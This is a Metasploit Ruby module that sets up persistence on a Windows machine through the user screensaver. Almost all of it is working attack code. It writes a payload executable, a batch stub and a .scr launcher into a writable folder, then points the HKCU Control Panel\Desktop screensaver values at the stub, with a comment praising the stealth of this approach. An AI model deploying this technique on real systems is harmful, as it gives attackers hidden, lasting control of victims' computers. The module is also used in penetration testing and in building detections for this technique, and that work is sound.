##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/post/file'

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::Windows::Registry
  include Msf::Post::File
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'User Screensaver Persistence',
      'Description'    => %q{
        This module will install a payload as the screensaver for a
        user by creating the setting in the registry to execute a
        specific screensaver executable.
        Any PE (.exe) can be renamed to .scr and set as the screensaver,
        however for this module the .scr file is simply a stub to run
        a .bat file, which kicks off the payload, then the original user
        screensaver.  The screensaver requires /s to run (no flags shows
        the settings).

        No payload handler is used due to the variable screensaver timeout
        length.  One must be started independent of this module.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'h00die',
        ],
      'Platform'       => [ 'win' ],
      'SessionTypes'   => [ 'meterpreter', 'shell' ],
      'Targets'        =>
        [
          [ 'Automatic', { } ]
        ],
      'References'     =>
        [
          ['URL', 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1180/T1180.md'],
          ['URL', 'https://attack.mitre.org/techniques/T1180/'],
          ['URL', 'https://www.welivesecurity.com/wp-content/uploads/2017/08/eset-gazer.pdf'],
          ['URL', 'https://en.wikipedia.org/wiki/Screensaver#Microsoft_Windows'],
          ['URL', 'https://support.microsoft.com/en-us/help/185348/how-to-change-the-logon-screen-saver-in-windows']
        ],
      'DisclosureDate' => "Aug 7 2017",
      'DefaultOptions' => 
        {
          'EXITFUNC' => 'thread',
          'DisablePayloadHandler' => 'true'
        },

    ))

    register_options([
      OptString.new('WritableDir', [ true, 'A directory where we can write files', 'C:\\ProgramData\\' ]),
      OptInt.new('SCREENSAVETIMEOUT', [ true, 'Seconds till screensaver becomes active', 0 ])
    ])
  end

  def exploit
    reg_root = 'HKEY_CURRENT_USER\Control Panel\Desktop'

    undo_script = []

    # check pre-altered values and create an undo script
    keys = registry_enumvals(reg_root)
    # we removed 'ScreenSaverIsSecure' to leave them the same as the system originally had it
    # this is a much more stealthy tactic
    ['SCRNSAVE.EXE', 'ScreenSaveTimeout', 'ScreenSaveActive'].each do |value|
      if keys.include?(value)
        data = registry_getvaldata(reg_root, value)
        undo_script << "reg.exe add \"#{reg_root}\" /v #{value} /t REG_SZ /d #{data} /f"
        print_status("Original #{value} value: #{data}")
      else
        undo_script << "reg.exe delete \"#{reg_root}\" /v #{value} /f"
      end
    end
    print_good("Script to revert changes:\n#{undo_script.join("\n")}")

    # upload payload
    payload = "#{datastore['WritableDir']}#{rand_text_alphanumeric 5..10}.exe"
    print_status("Writing payload to #{payload}")
    write_file(payload, generate_payload_exe)

    # upload stub, we use this to kick our shell off, then the original screensaver
    stub = "@echo off\r\n"
    stub << "start /B #{payload}\r\n"
    stub << "start /B #{registry_getvaldata(reg_root, 'SCRNSAVE.EXE')} /s\r\n"

    batch_file = "#{datastore['WritableDir']}#{rand_text_alphanumeric 5..10}.bat"
    print_status("Writing stub to #{batch_file}")
    write_file(batch_file, stub)

    exe_file = "#{datastore['WritableDir']}#{rand_text_alphanumeric 5..10}.scr"
    print_status("Writing scr stub to #{exe_file}")
    exec_payload = Msf::PayloadGenerator.new(
      {
         :payload => 'windows/exec',
         :framework => framework,
         :format => 'exe-small',
         :badchars => '\x00',
         :arch => 'x86',
         :platform => 'Windows',
         :datastore => {'CMD'=>batch_file}
      }
    ).generate_payload

    write_file(exe_file, exec_payload)

    # set registry
    print_status('Changing screensaver')
    registry_setvaldata(reg_root, 'ScreenSaveActive', '1', 'REG_SZ') # enable screensaver
    unless datastore['SCREENSAVETIMEOUT'] == 0
      registry_setvaldata(reg_root, 'ScreenSaveTimeout', datastore['SCREENSAVETIMEOUT'].to_s, 'REG_SZ') # wait time till screensaver acrivated
    end
    #registry_setvaldata(reg_root, 'ScreenSaverIsSecure', '0', 'REG_SZ') # disable password to unlock screensaver
    registry_setvaldata(reg_root, 'SCRNSAVE.EXE', exe_file, 'REG_SZ') # binary payload

    print_good('Screensaver set!')
  end
end
